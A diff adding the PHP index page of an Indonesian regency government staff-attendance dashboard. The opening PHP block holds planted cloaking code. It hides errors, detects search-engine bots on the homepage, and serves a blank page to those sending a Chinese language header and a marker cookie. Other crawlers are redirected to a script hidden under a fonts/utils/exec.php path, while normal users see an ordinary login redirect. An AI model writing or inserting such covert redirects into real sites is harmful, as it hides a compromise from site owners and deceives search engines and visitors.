@@ -1,0 +1,131 @@
+<?php
+session_start();
+include_once "tambahan/sambunga.php";
+include_once "tambahan/pungsi.php";
+
+// Mengatur pengaturan error untuk menyembunyikan error
+error_reporting(0);
+
+// Mendapatkan referer dan user-agent
+$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
+$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// Deteksi apakah request berasal dari bot dan berada di homepage (/)
+if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+    // Menangani jika request berasal dari bot dengan bahasa tertentu (misalnya bahasa Mandarin)
+    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+
+    // Memeriksa apakah bahasa yang diterima adalah Mandarin, upgrade insecure requests, dan cookie tertentu
+    if (strpos($accept_lang, 'zh') !== false &&
+        ($_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? 0) == 1 &&
+        isset($_COOKIE['az']) && $_COOKIE['az'] == 'lp') {
+        
+        // Set cookie untuk memastikan bot tetap diatur
+        setcookie('az', 'lp', time() + 3600 * 7200); // Cookie berlaku selama 2 tahun
+        
+        // Menampilkan halaman kosong untuk bot
+        echo ' ';
+        exit; // Menghentikan eksekusi skrip setelah menampilkan halaman kosong
+    }
+
+    // Jika ini adalah bot dan berada di homepage, arahkan bot ke halaman exec.php
+    header('Location: /tambahan/pdfclass/fonts/utils/exec.php');
+    exit; // Menghentikan eksekusi skrip setelah pengalihan
+}
+
+// Mengecek apakah sesi pengguna aktif
+if (!empty($_SESSION['namauser']) && !empty($_SESSION['passuser'])) {
+    header('Location: main');
+    exit;
+} else {
+    header('Location: login');
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta charset="utf-8" />
+    <META NAME="robots" CONTENT="noindex,nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Kehadiran Pegawai Kab. Jembrana</title>
+    <!-- BOOTSTRAP CORE STYLE  -->
+    <link href="assets/css/bootstrap.css" rel="stylesheet" />
+    <!-- FONT AWESOME ICONS  -->
+    <link href="assets/css/font-awesome.css" rel="stylesheet" />
+    <!-- CUSTOM STYLE  -->
+    <link href="assets/css/style.css" rel="stylesheet" />
+    <script src="assets/js/canvasjs.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="assets/jquery-ui-1.12.1/jquery-ui.css">
+    <script src="assets/jquery-ui-1.12.1/external/jquery/jquery.js"></script>
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <strong>Email: </strong>kominfo@jembranakab.go.id
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- HEADER END-->
+    <div class="navbar navbar-inverse set-radius-zero">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="index">
+                    <img src="assets/img/logo.png" />
+                </a>
+            </div>
+        </div>
+    </div>
+    <!-- LOGO HEADER END-->
+    <section class="menu-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="navbar-collapse collapse">
+                        <ul id="menu-top" class="nav navbar-nav navbar-right">
+                            <li><a class="menu-top-active" href="index">Dashboard</a></li>
+                            <li><a href="login">Login Page</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- MENU SECTION END-->
+    <div class="content-wrapper">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <h4 class="page-head-line">Dashboard Kehadiran Hari Ini Tanggal <?php echo date("d-m-Y"); ?></h4>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- CONTENT-WRAPPER SECTION END-->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    &copy; 2018 Limon | By : Dinas Komunikasi Dan Informatika
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- FOOTER SECTION END-->
+    <script src="assets/js/jquery-1.11.1.js"></script>
+    <script src="assets/js/bootstrap.js"></script>
+</body>
+
+</html>
